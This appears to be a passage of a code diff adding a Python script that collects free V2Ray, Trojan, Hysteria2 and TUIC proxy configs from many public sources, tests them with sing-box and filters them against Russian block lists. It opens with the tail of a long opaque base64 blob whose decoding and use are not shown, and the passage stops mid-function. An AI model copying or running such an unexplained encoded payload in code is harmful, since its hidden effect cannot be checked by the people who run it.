QzkXJRSTjzG/yTiRhTxkS/WNUNoksG762/7bvR0YY86zOuT5yycRdiyhBVFEoGdvuKbDMXNtkCMsdGED1r6WpXHedhDPtX8Wl7h7YX8jtAW38IvXItgK69q/8YSWHPAAxuDr3pti15BKh5yX/3hUgNednEkSHel62GzAzIquEOBG2C1vKRDZVM7zIWrMnSoOOXWAs7iSn8OV32ZDqm+9vbUR5s5euWmfDygnWAWFWhiqidQbwecw556s51jxMkV5DELTE5W6AY6FYQOxz2RPmHav0NzN4yUxv8hR82siWiS+7zyCDyt7H/bZz/W3T57wRdtoVFK5Np3X6qZy09pjfEcXxiZVeqbyZuYoBMWi+K1nyg020fK3p8JVqsA7acjd7vIZqDtArtBTG+WtfWD0rRy2JX1PqGiR3eWNMzqq4qHkNSHZcSd8yDHYRIhp4xJgVnSKS96jOkV9C4udr2iolSlD9hPmKjEO2VlXr5bcq/6gukQp/WvjoL6ExQxTVJlz73gYu5APSZP3bs0tumJTYomS5ijckrfOjIjHgV2mFcWGyoKR23gNslQ/SK3VA7AF6b6sQghz9G4nO2Ot9CeXgdtYsaC+GsDbUGJ36NmvKL4OOlDUNahKct2aPH4aJMWg8KLFTI9MPafOeAKmfZ6KBxU/ZTxxHjkPaGWMhl57WLjHDlpjSYeI6NXPLiepeeVIl5/T1UMh8OQfsyp82M26SpgBNTe5keMiVWAQkVBFVpCgSAl3gbc6e8KHOKoGu1ARFre8slk0EqYqr4TXQ5hfE84Xc7oyBLyIqTJ4l07NQ1pTrKGfYpdf3j7E4XBxqVkBOxp7l74jcfJsHrXEchGuN52eQQfyqYbqljJpvFPKAg0kIFi5w69kPIosgAWJCZh7Tfv9x8uq4HICHvHrWwdUDaBmP6hr8ENQ5ekhaqyP+hBTlOaGP95ly6x9Dw4xrbM41mPrh/upOXoxPOL1xzOmY4ZQppKWiLRPerlTA6SV+eKmWTzVlOl9XfSzQQOOmA1UVZrQWFjiyEKc+XUJcLKiDPve7W7lHxLqG++2rVd7jaiuApM1DHGtBdN3pye0k9vCFh3yv2FBp82+XNBkjk3LytZaP1ftqSlrcPWthgJ+RcKgODqZ8AYoC6TcCPXf0RaKl9ohAG5BJO5lQt+aOEGn/wc1OCaAUvYjkOxonQccRFCuiIAYh+InotIoFd4Rf4A+4bTSwsj5V5yUbQtAFzvS5g4QMQ77e7O9G9usU3Bpt9hEVSEo/5O4JxnaiSos1J7AChrXWYUV712nMTCAEFnUcZGgCbNVfb8SRNzwmexL1BMOChMuo/WqjhvKmPJzTETHeqw6mEyZg5XEP40yh3nVAbwlU4E2fk8bg5Ct6huefNBatXS5EVHe2ZopC5iGGaketWKZn49VVk4HE1JOSxQ4Q9Zp69JJExAtFLOdCOxHDpk5ERCGg+4ai1wKD36MqHzUzsv/82T2/0977/f/MfKyHa2T659VtMcuvuf/8V2ZiITcLW2KqlYWQo3n9TBUg06SWsmUwJe'))
+import base64
+import json
+import os
+import re
+import socket
+import subprocess
+import tempfile
+import time
+import urllib.parse
+import sys
+import hashlib
+import ipaddress
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm
+from radix import Radix
+from bs4 import BeautifulSoup
+
+PLAINTEXT_URLS = [
+    "https://raw.githubusercontent.com/Mosifree/-FREE2CONFIG/refs/heads/main/T,H",
+    "https://raw.githubusercontent.com/mahdibland/V2RayAggregator/refs/heads/master/sub/sub_merge.txt",
+    "https://raw.githubusercontent.com/Epodonios/v2ray-configs/main/All_Configs_Sub.txt",
+    "https://raw.githubusercontent.com/MrMohebi/xray-proxy-grabber-telegram/refs/heads/master/collected-proxies/row-url/all.txt",
+    "https://raw.githubusercontent.com/MrMohebi/xray-proxy-grabber-telegram/master/collected-proxies/row-url/actives.txt",
+    "https://raw.githubusercontent.com/itsyebekhe/PSG/refs/heads/main/config.txt",
+    "https://raw.githubusercontent.com/barry-far/V2ray-Config/refs/heads/main/All_Configs_Sub.txt",
+    "https://raw.githubusercontent.com/barry-far/V2ray-config/main/Sub1.txt",
+    "https://raw.githubusercontent.com/peasoft/NoMoreWalls/master/list_raw.txt",
+    "https://raw.githubusercontent.com/ermaozi/get_subscribe/main/subscribe/v2ray.txt",
+    "https://raw.githubusercontent.com/theGreatPeter/v2rayNodes/main/nodes.txt",
+    "https://raw.githubusercontent.com/Mahdi0024/ProxyCollector/master/sub/proxies.txt",
+    "https://raw.githubusercontent.com/Barabama/FreeNodes/master/nodes/merged.txt",
+    "https://raw.githubusercontent.com/coldwater-10/V2Hub2/main/merged",
+    "https://raw.githubusercontent.com/Proxydaemitelegram/Proxydaemi44/refs/heads/main/Proxydaemi44",
+    "https://raw.githubusercontent.com/ndsphonemy/proxy-sub/refs/heads/main/speed.txt",
+    "https://raw.githubusercontent.com/Mosifree/-FREE2CONFIG/refs/heads/main/Movaghat",
+    "https://raw.githubusercontent.com/tkamirparsa/Javid-shah/refs/heads/main/Sub.text",
+    "https://raw.githubusercontent.com/awesome-vpn/awesome-vpn/master/all",
+    "https://raw.githubusercontent.com/mahdibland/ShadowsocksAggregator/master/sub/sub_merge.txt",
+    "https://raw.githubusercontent.com/Surfboardv2ray/v2ray-worker-sub/refs/heads/master/providers/providers",
+    "https://raw.githubusercontent.com/NiREvil/vless/refs/heads/main/sub/v2rayng-wg.txt",
+    "https://raw.githubusercontent.com/NiREvil/vless/refs/heads/main/sub/SSTime",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/V2RAY_RAW.txt",
+    "https://raw.githubusercontent.com/Kwinshadow/TelegramV2rayCollector/refs/heads/main/sublinks/mix.txt",
+    "https://raw.githubusercontent.com/LalatinaHub/Mineral/refs/heads/master/result/nodes",
+    "https://raw.githubusercontent.com/MhdiTaheri/V2rayCollector_Py/refs/heads/main/sub/Mix/mix.txt",
+    "https://raw.githubusercontent.com/MhdiTaheri/V2rayCollector/refs/heads/main/sub/mix",
+    "https://raw.githubusercontent.com/mehran1404/Sub_Link/refs/heads/main/V2RAY-Sub.txt",
+    "https://raw.githubusercontent.com/shabane/kamaji/master/hub/merged.txt",
+    "https://raw.githubusercontent.com/wuqb2i4f/xray-config-toolkit/main/output/base64/mix-uri",
+    "https://raw.githubusercontent.com/Rayan-Config/C-Sub/refs/heads/main/configs/proxy.txt",
+    "https://raw.githubusercontent.com/sinabigo/Xray/main/@sinavm",
+    "https://raw.githubusercontent.com/MahsaNetConfigTopic/config/refs/heads/main/xray_final.txt",
+    "https://raw.githubusercontent.com/darkvpnapp/CloudflarePlus/refs/heads/main/proxy",
+    "https://raw.githubusercontent.com/sakha1370/OpenRay/refs/heads/main/output/all_valid_proxies.txt",
+    "https://raw.githubusercontent.com/sevcator/5ubscrpt10n/main/protocols/vl.txt",
+    "https://raw.githubusercontent.com/yitong2333/proxy-minging/refs/heads/main/v2ray.txt",
+    "https://raw.githubusercontent.com/miladtahanian/V2RayCFGDumper/refs/heads/main/config.txt",
+    "https://raw.githubusercontent.com/miladtahanian/multi-proxy-config-fetcher/refs/heads/main/configs/proxy_configs.txt",
+    "https://raw.githubusercontent.com/YasserDivaR/pr0xy/refs/heads/main/ShadowSocks2021.txt",
+    "https://raw.githubusercontent.com/mohamadfg-dev/telegram-v2ray-configs-collector/refs/heads/main/category/vless.txt",
+    "https://raw.githubusercontent.com/youfoundamin/V2rayCollector/main/mixed_iran.txt",
+    "https://raw.githubusercontent.com/youfoundamin/V2rayCollector/main/vless_iran.txt",
+    "https://raw.githubusercontent.com/youfoundamin/V2rayCollector/main/vmess_iran.txt",
+    "https://raw.githubusercontent.com/youfoundamin/V2rayCollector/main/trojan_iran.txt",
+    "https://github.com/Argh94/Proxy-List/raw/refs/heads/main/All_Config.txt",
+    "https://raw.githubusercontent.com/Argh94/V2RayAutoConfig/refs/heads/main/configs/Russia.txt",
+    "https://raw.githubusercontent.com/STR97/STRUGOV/refs/heads/main/STR.BYPASS",
+    "https://raw.githubusercontent.com/V2RayRoot/V2RayConfig/refs/heads/main/Config/vless.txt",
+    "https://github.com/AvenCores/goida-vpn-configs/raw/refs/heads/main/githubmirror/26.txt",
+    "https://raw.githubusercontent.com/liketolivefree/kobabi/refs/heads/main/sub.txt",
+    "https://raw.githubusercontent.com/F0rc3Run/F0rc3Run/main/Special/Telegram.txt",
+    "https://raw.githubusercontent.com/F0rc3Run/F0rc3Run/refs/heads/main/Best-Results/proxies.txt",
+    "https://raw.githubusercontent.com/Ashkan-m/v2ray/main/Sub.txt",
+    "https://raw.githubusercontent.com/Everyday-VPN/Everyday-VPN/main/subscription/main.txt",
+    "https://raw.githubusercontent.com/Everyday-VPN/Everyday-VPN/main/subscription/test.txt",
+    "https://v2.alicivil.workers.dev/",
+    "https://robin.nscl.ir",
+    "https://vpn.fail/free-proxy/v2ray",
+    "https://weoknow.com/data/dayupdate/1/z.txt",
+    "https://igdux.top/~FREE2CONFIG,T,H",
+    "https://istanbulsydneyhotel.com/blogs/site/sni.php",
+    "https://hideshots.eu/sub.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/Vmess.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/Vless.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/Tuic.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/Trojan.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/ShadowSocksR.txt",
+    "https://raw.githubusercontent.com/10ium/ScrapeAndCategorize/refs/heads/main/output_configs/ShadowSocks.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/other.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/shadowsocks.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/trojan.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/vless.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/vmess.txt",
+    "https://raw.githubusercontent.com/Firmfox/Proxify/refs/heads/main/v2ray_configs/seperated_by_protocol/warp.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/BLACK_SS%2BAll_RUS.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/BLACK_VLESS_RUS.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/BLACK_VLESS_RUS_mobile.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/Vless-Reality-White-Lists-Rus-Mobile-2.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/Vless-Reality-White-Lists-Rus-Mobile.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/WHITE-CIDR-RU-all.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/WHITE-CIDR-RU-checked.txt",
+    "https://raw.githubusercontent.com/igareck/vpn-configs-for-russia/refs/heads/main/WHITE-SNI-RU-all.txt",
+    "https://gitverse.ru/api/repos/bywarm/rser/raw/branch/master/selected.txt",
+    "https://wlr.s3-website.cloud.ru/bucket-93b250/selected.txt",
+    "https://bp.wl.free.nf/confs/selected.txt",
+    "https://gitverse.ru/api/repos/bywarm/rser/raw/branch/master/merged.txt",
+    "https://wlr.s3-website.cloud.ru/bucket-93b250/merged.txt",
+    "https://bp.wl.free.nf/confs/merged.txt",
+    "https://gitverse.ru/api/repos/bywarm/rser/raw/branch/master/wl.txt",
+    "https://wlr.s3-website.cloud.ru/bucket-93b250/wl.txt",
+    "https://bp.wl.free.nf/confs/wl.txt",
+    "https://raw.githubusercontent.com/nscl5/5/main/configs/all.txt",
+    "https://raw.githubusercontent.com/FNET00bot/FNET00/Config/Main",
+    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/ss.txt",
+    "https://raw.githubusercontent.com/R3ZARAHIMI/7/main/Config_jo.txt" 
+]
+BASE64_URLS = [
+    "https://raw.githubusercontent.com/mahsanet/MahsaFreeConfig/main/mci/sub_1.txt",
+    "https://raw.githubusercontent.com/ALIILAPRO/v2rayNG-Config/main/sub.txt",
+    "https://raw.githubusercontent.com/mahsanet/MahsaFreeConfig/refs/heads/main/mtn/sub_1.txt",
+    "https://raw.githubusercontent.com/AzadNetCH/Clash/main/AzadNet.txt",
+    "https://raw.githubusercontent.com/mfuu/v2ray/master/v2ray",
+    "https://raw.githubusercontent.com/aiboboxx/v2rayfree/main/v2",
+    "https://raw.githubusercontent.com/freefq/free/master/v2",
+    "https://raw.githubusercontent.com/Pawdroid/Free-servers/main/sub",
+    "https://raw.githubusercontent.com/ripaojiedian/freenode/main/sub",
+    "https://raw.githubusercontent.com/yebekhe/vpn-fail/refs/heads/main/sub-link",
+    "https://raw.githubusercontent.com/w1770946466/Auto_proxy/main/Long_term_subscription_num",
+    "https://raw.githubusercontent.com/Leon406/SubCrawler/refs/heads/main/sub/share/vless",
+    "https://raw.githubusercontent.com/Leon406/SubCrawler/refs/heads/main/sub/share/hysteria2",
+    "https://raw.githubusercontent.com/Leon406/SubCrawler/refs/heads/main/sub/share/a11",
+    "https://raw.githubusercontent.com/acymz/AutoVPN/refs/heads/main/data/V2.txt",
+    "https://raw.githubusercontent.com/mheidari98/.proxy/refs/heads/main/all",
+    "https://raw.githubusercontent.com/mahdibland/V2RayAggregator/master/Eternity",
+    "https://raw.githubusercontent.com/ssrsub/ssr/master/v2ray",
+    "https://raw.githubusercontent.com/MrPooyaX/VpnsFucking/main/BeVpn.txt",
+    "https://shadowmere.xyz/api/b64sub/",
+    "https://www.xrayvip.com/free.txt",
+    "https://raw.githubusercontent.com/ts-sf/fly/main/v2",
+    "https://a.nodeshare.xyz/uploads/2025/7/20250712.txt",
+    "https://v2rayshare.githubrowcontent.com/2025/07/20250712.txt",
+    "https://a.nodeshare.xyz/uploads/2025/7/20250712.txt",
+    "https://oneclash.githubrowcontent.com/2025/07/20250712.txt",
+    "https://raw.githubusercontent.com/awesome-vpn/awesome-vpn/master/all",
+    "https://trojanvmess.pages.dev/cmcm?b64",
+    "https://shadowmere.xyz/api/b64sub/",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/python/hy2",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/python/hysteria2",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/python/hysteria",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/splitted/vless",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/splitted/vmess",
+    "https://raw.githubusercontent.com/Surfboardv2ray/TGParse/main/python/trojan",
+    "https://raw.githubusercontent.com/barry-far/V2ray-config/main/All_Configs_base64_Sub.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/v2ray/super-sub.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/v2ray/all_sub.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/filtered/subs/vless.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/filtered/subs/vmess.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/filtered/subs/trojan.txt",
+    "https://raw.githubusercontent.com/MatinGhanbari/v2ray-configs/main/subscriptions/filtered/subs/hysteria2.txt"
+]
+
+SING_BOX_PATH = "./sing-box"
+MAX_WORKERS_CHECK = 300
+MAX_WORKERS_SCRAPE = 30
+TIMEOUT = 10
+API_RETRIES = 2
+GH_TOKEN = os.environ.get("GH_TOKEN")
+GIST_ID = os.environ.get("GIST_ID")
+VERCEL_TOKEN = os.environ.get("VERCEL_TOKEN")
+PROJ_ID = os.environ.get("PROJ_ID")
+GIST_FILENAME = "gistfile1.txt"
+PING_FILENAME = "pings.json"
+ENV_KEY = "GIST_URL"
+IP_API_URL = "http://ipinfo.io/json"
+IP_API_FALLBACK_URL = "http://ip-api.com/json" # Запасной API для выхода
+IP_ENTRY_API_URL = "http://ipinfo.io/{ip}/json"
+IP_ENTRY_API_FALLBACK_URL = "http://ip-api.com/json/{ip}?fields=country" # Запасной API для входа
+TEST_URL = "http://www.gstatic.com/generate_204"
+OPENAI_URL = "https://api.openai.com/v1/models"
+BANNED_ISP_REGEX = r"(?i)(hetzner|cloudflare|pq hosting|amazon|the constant company|gthost|contabo|m247|ponynet|fdcservers|oracle|digitalocean|ovh|kaopu|netcup|upcloud|worktitans|alibaba|global connectivity solutions llp|baykov|akamao|lucidacloud|global cloud|oc networks limited|play2go|acgnode inc|netranex|cognetcloud|rj network|bluevps|vdska|alexhost|h2nexus|hkt|timeweb|julian|microsoft|hostkey|dataforest|nexet|cloud hosting)"
+RKN_SUBNET_URL = "https://antifilter.network/download/subnet.lst"
+RKN_IPSUM_URL = "https://antifilter.network/download/ipsum.lst"
+RKN_BANNED_NETWORKS = Radix()
+GEMINI_ALLOWED = {'AL', 'DZ', 'AS', 'AO', 'AI', 'AQ', 'AG', 'AR', 'AM', 'AW', 'AU', 'AT', 'AZ', 'BS', 'BH', 'BD', 'BB', 'BE', 'BZ', 'BJ', 'BM', 'BT', 'BO', 'BA', 'BW', 'BR', 'IO', 'VG', 'BN', 'BG', 'BF', 'BI', 'CV', 'KH', 'CM', 'CA', 'BQ', 'KY', 'CF', 'TD', 'CL', 'CX', 'CC', 'CO', 'KM', 'CK', 'CI', 'CR', 'HR', 'CW', 'CZ', 'CD', 'DK', 'DJ', 'DM', 'DO', 'EC', 'EG', 'SV', 'GQ', 'ER', 'EE', 'SZ', 'ET', 'FK', 'FO', 'FJ', 'FI', 'FR', 'GA', 'GM', 'GE', 'DE', 'GH', 'GI', 'GR', 'GL', 'GD', 'GU', 'GT', 'GG', 'GN', 'GW', 'GY', 'HT', 'HM', 'HN', 'HU', 'IS', 'IN', 'ID', 'IQ', 'IE', 'IM', 'IL', 'IT', 'JM', 'JP', 'JE', 'JO', 'KZ', 'KE', 'KI', 'XK', 'KG', 'KW', 'LA', 'LV', 'LB', 'LS', 'LR', 'LY', 'LI', 'LT', 'LU', 'MG', 'MW', 'MY', 'MV', 'ML', 'MT', 'MH', 'MR', 'MU', 'MX', 'FM', 'MN', 'ME', 'MS', 'MA', 'MZ', 'NA', 'NR', 'NP', 'NL', 'NC', 'NZ', 'NI', 'NE', 'NG', 'NU', 'NF', 'MK', 'MP', 'NO', 'OM', 'PK', 'PW', 'PS', 'PA', 'PG', 'PY', 'PE', 'PH', 'PN', 'PL', 'PT', 'PR', 'QA', 'CY', 'CG', 'RO', 'RW', 'BL', 'KN', 'LC', 'PM', 'VC', 'SH', 'WS', 'ST', 'SA', 'SN', 'RS', 'SC', 'SL', 'SG', 'SK', 'SI', 'SB', 'SO', 'ZA', 'GS', 'KR', 'SS', 'ES', 'LK', 'SD', 'SR', 'SE', 'CH', 'TW', 'TJ', 'TZ', 'TH', 'TL', 'TG', 'TK', 'TO', 'TT', 'TN', 'TR', 'TM', 'TC', 'TV', 'UG', 'UA', 'GB', 'AE', 'US', 'UM', 'VI', 'UY', 'UZ', 'VU', 'VE', 'VN', 'WF', 'EH', 'YE', 'ZM', 'ZW'}
+YT_MUSIC_ALLOWED = {'DZ', 'AS', 'AR', 'AW', 'AU', 'AT', 'AZ', 'BH', 'BD', 'BY', 'BE', 'BM', 'BO', 'BA', 'BR', 'BG', 'KH', 'CA', 'KY', 'CL', 'CO', 'CR', 'HR', 'CY', 'CZ', 'DK', 'DO', 'EC', 'EG', 'SV', 'EE', 'FI', 'FR', 'GF', 'PF', 'GE', 'DE', 'GH', 'GR', 'GP', 'GU', 'GT', 'HN', 'HK', 'HU', 'IS', 'IN', 'ID', 'IQ', 'IE', 'IL', 'IT', 'JM', 'JP', 'JO', 'KZ', 'KE', 'KW', 'LA', 'LV', 'LB', 'LY', 'LI', 'LT', 'LU', 'MY', 'MT', 'MX', 'MA', 'NP', 'NL', 'NZ', 'NI', 'NG', 'MK', 'MP', 'NO', 'OM', 'PK', 'PA', 'PG', 'PY', 'PE', 'PH', 'PL', 'PT', 'PR', 'QA', 'RE', 'RO', 'RU', 'SA', 'SN', 'RS', 'SG', 'SK', 'SI', 'ZA', 'KR', 'ES', 'LK', 'SE', 'CH', 'TW', 'TZ', 'TH', 'TN', 'TR', 'TC', 'VI', 'UG', 'UA', 'AE', 'GB', 'US', 'UY', 'VE', 'VN', 'YE', 'ZW'}
+
+def get_free_port():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(("", 0))
+        return s.getsockname()[1]
+
+def country_flag(code):
+    if not code or len(code) != 2: return "🏁"
+    return "".join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in code)
+
+def safe_base64_decode(s):
+    if not s: return b""
+    s = s.strip().replace('\n', '').replace('\r', '')
+    pad = len(s) % 4
+    if pad: s += '=' * (4 - pad)
+    try: return base64.urlsafe_b64decode(s)
+    except:
+        try: return base64.b64decode(s)
+        except: return b""
+
+def load_rkn_lists():
+    print("Downloading RKN block lists...")
+    urls = [RKN_SUBNET_URL, RKN_IPSUM_URL]
+    count = 0
+    for url in urls:
+        try:
+            r = requests.get(url, timeout=15)
+            r.raise_for_status()
+            for line in r.text.splitlines():
+                if line.strip():
+                    node = RKN_BANNED_NETWORKS.add(line.strip())
+                    node.data['banned'] = True
+                    count += 1
+        except Exception as e:
+            print(f"Warning: Failed to load RKN list {url}: {e}")
+    print(f"Loaded {count} banned networks into Radix tree.")
+
+def is_ip_banned(ip_str):
+    try:
+        node = RKN_BANNED_NETWORKS.search_best(ip_str)
+        return node is not None and 'banned' in node.data
+    except (ValueError, TypeError):
+        return False
+        
+CHEBURCHECK_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Language': 'ru,en;q=0.9', 'Dnt': '1', 'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1',
+}
+cheburcheck_cache = {}
+
+def cheburcheck_is_blocked(target):
+    if not target: return False
+    if target in cheburcheck_cache: return cheburcheck_cache[target]
+    try:
+        url = f"https://cheburcheck.ru/check?target={target}"
+        response = requests.get(url, headers=CHEBURCHECK_HEADERS, timeout=15)
+        response.raise_for_status()
+        soup = BeautifulSoup(response.text, 'lxml')
+        panel = soup.find('div', class_='result-panel')
+        if not panel:
+            cheburcheck_cache[target] = False
+            return False
+        panel_classes = panel.get('class', [])
+        if 'whitelist-theme' in panel_classes:
+            cheburcheck_cache[target] = False
+            return False
+        if 'blocked-theme' in panel_classes:
+            print(f"[Cheburcheck] {target} is BLOCKED (theme: blocked-theme). Filtering out.")
+            cheburcheck_cache[target] = True
+            return True
+        cheburcheck_cache[target] = False
+        return False
+    except Exception as e:
+        print(f"Warning: Cheburcheck request failed for {target}: {e}")
+        return False
+
+def fetch_url_content(url):
+    try:
+        r = requests.get(url, timeout=10)
+        r.raise_for_status()
+        return r.text
+    except: return None
+
+def scrape_all_sources():
+    print("Starting scraper...")
+    all_proxies = set()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS_SCRAPE) as exe:
+        futures = {exe.submit(fetch_url_content, u): u for u in PLAINTEXT_URLS}
+        for f in tqdm(as_completed(futures), total=len(PLAINTEXT_URLS), desc="Plaintext"):
+            content = f.result()
+            if content:
+                content = content.replace('<br/>', '\n').replace('<br>', '\n')
+                for line in content.splitlines():
+                    l = line.strip()
+                    # Добавлены hy2 и tuic
+                    if l.startswith(('vmess://', 'vless://', 'trojan://', 'hysteria2://', 'hy2://', 'tuic://')): all_proxies.add(l)
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS_SCRAPE) as exe:
+        futures = {exe.submit(fetch_url_content, u): u for u in BASE64_URLS}
+        for f in tqdm(as_completed(futures), total=len(BASE64_URLS), desc="Base64"):
+            content = f.result()
+            if content:
+                try:
+                    decoded = safe_base64_decode(content).decode('utf-8', errors='ignore')
+                    for line in decoded.splitlines():
+                        l = line.strip()
+                        # Добавлены hy2 и tuic
+                        if l.startswith(('vmess://', 'vless://', 'trojan://', 'hysteria2://', 'hy2://', 'tuic://')): all_proxies.add(l)
+                except: pass
+
+    if GIST_ID and GH_TOKEN:
+        try:
+            print("Fetching existing Gist...")
+            r = requests.get(f"https://api.github.com/gists/{GIST_ID}", headers={'Authorization': f'token {GH_TOKEN}'})
+            files = r.json().get('files', {})
+            content = files.get(GIST_FILENAME, {}).get('content', '')
+            for line in content.splitlines():
+                l = line.strip()
+                if l: all_proxies.add(l)
+        except Exception as e: print(f"Gist fetch warning: {e}")
+
+    print(f"Total unique raw links: {len(all_proxies)}")
+    return list(all_proxies)
+
+def parse_proxy_link(link):
+    try:
+        # Hysteria2 / hy2 support
+        if link.startswith('hysteria2://') or link.startswith('hy2://'):
+            parsed = urllib.parse.urlparse(link)
+            query = urllib.parse.parse_qs(parsed.query)
+            data = {
+                'protocol': 'hysteria2',
+                'server': parsed.hostname,
+                'port': parsed.port,
+                'password': parsed.username, # In hy2 URL, password is often in userinfo if no uuid
+                'sni': query.get('sni', [parsed.hostname])[0],
+                'insecure': query.get('insecure', ['0'])[0] == '1'
+            }
+            return data
+
+        # TUIC support
+        if link.startswith('tuic://'):
+            parsed = urllib.parse.urlparse(link)
+            query = urllib.parse.parse_qs(parsed.query)
+            # tuic://uuid:password@host:port?sni=...
+            data = {
+                'protocol': 'tuic',
+                'server': parsed.hostname,
+                'port': parsed.port,
+                'uuid': parsed.username,
+                'password': parsed.password,
+                'sni': query.get('sni', [parsed.hostname])[0],
+                'congestion_control': query.get('congestion_control', ['bbr'])[0],
+                'udp_relay_mode': query.get('udp_relay_mode', ['native'])[0]
+            }
+            return data
+
+        if link.startswith('vmess://'):
+            data = json.loads(safe_base64_decode(link[8:]).decode('utf-8'))
+            data['protocol'] = 'vmess'
+            data['uuid'] = data.get('id')
+            data['server'] = data.get('add')
+            data['port'] = int(data.get('port'))
+            data['alter_id'] = int(data.get('aid', 0))
+            data['security'] = data.get('scy', 'auto')
+            data['network'] = data.get('net', 'tcp')
+            data['sni'] = data.get('host') or data.get('sni')
+            data['path'] = data.get('path')
+            return data
+
+        parsed = urllib.parse.urlparse(link)
+        protocol = parsed.scheme
+        if protocol == 'ss': return {'protocol': 'shadowsocks'}
+        if protocol not in ['vless', 'trojan']: return None
+
+        data = {
+            'protocol': protocol,
+            'server': parsed.hostname,
+            'port': parsed.port,
+            'uuid': parsed.username,
+            'password': parsed.username
+        }
+        query = urllib.parse.parse_qs(parsed.query)
+        for k, v in query.items(): data[k.lower()] = v[0]
+        data['network'] = data.get('type', 'tcp')
+        data['sni'] = data.get('sni') or data.get('host')
+        return data
+    except: return None
+
+def generate_singbox_config(data, local_port):
+    config = {
+        "log": {"disabled": True},
+        "inbounds": [{"type": "mixed","tag": "in","listen": "127.0.0.1","listen_port": local_port,"set_system_proxy": False}],
+        "outbounds": []
+    }
+    outbound = {"tag": "proxy", "type": data['protocol'], "server": data['server'], "server_port": int(data['port'])}
+
+    # Hysteria2 Config
+    if data['protocol'] == 'hysteria2':
+        outbound['password'] = data.get('password', '')
+        tls_conf = {"enabled": True, "server_name": data.get('sni', data['server']), "insecure": data.get('insecure', False)}
+        outbound['tls'] = tls_conf
+        # Optional: up_mbps/down_mbps can be added if needed, but sing-box works without them
+
+    # TUIC Config
+    elif data['protocol'] == 'tuic':
+        outbound['uuid'] = data['uuid']
+        outbound['password'] = data.get('password', '')
+        outbound['congestion_control'] = data.get('congestion_control', 'bbr')
+        outbound['udp_relay_mode'] = data.get('udp_relay_mode', 'native')
+        outbound['zero_rtt_handshake'] = True
+        tls_conf = {"enabled": True, "server_name": data.get('sni', data['server']), "alpn": ["h3"]}
+        outbound['tls'] = tls_conf
+
+    # VMess Config
+    elif data['protocol'] == 'vmess':
+        outbound.update({"uuid": data['uuid'], "alter_id": int(data.get('alter_id', 0)), "security": data.get('security', 'auto')})
+        # TLS Logic for VMess
+        if data.get('tls') == 'tls':
+             tls_conf = {"enabled": True, "server_name": data.get('sni', ''), "insecure": False}
+             outbound["tls"] = tls_conf
+
+    # VLess Config
+    elif data['protocol'] == 'vless':
+        outbound["uuid"] = data['uuid']
+        if data.get('flow'): outbound["flow"] = data['flow']
+        # TLS/Reality Logic
+        tls_enabled = False
+        if data.get('security') in ['tls', 'reality']: tls_enabled = True
+        
+        if tls_enabled:
+            tls_conf = {"enabled": True, "server_name": data.get('sni', ''), "insecure": False}
+            if data.get('security') == 'reality':
+                tls_conf["reality"] = {"enabled": True, "public_key": data.get('pbk', ''), "short_id": data.get('sid', '')}
+            if data.get('fp'): tls_conf["utls"] = {"enabled": True, "fingerprint": data['fp']}
+            outbound["tls"] = tls_conf
+
+    # Trojan Config
+    elif data['protocol'] == 'trojan':
+        outbound["password"] = data['password']
+        # Trojan usually implies TLS
+        tls_conf = {"enabled": True, "server_name": data.get('sni', ''), "insecure": False}
+        outbound["tls"] = tls_conf
+
+    # Transport Layer (WS/gRPC) for VMess/VLess/Trojan
+    transport = {}
+    net = data.get('network', 'tcp')
